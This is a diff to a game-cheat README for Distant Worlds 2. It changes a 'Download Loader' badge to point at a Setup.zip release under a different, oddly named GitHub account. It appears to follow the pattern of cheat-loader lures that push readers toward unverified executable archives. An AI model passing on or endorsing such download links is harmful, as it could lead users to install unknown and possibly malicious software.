@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Distant Worlds 2 Cheats
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Distant-Worlds-2-Cheats` · Updated: 2026-10-31
 
 **Tags:** `distant-worlds-2` `4x` `space` `grand-strategy`
+
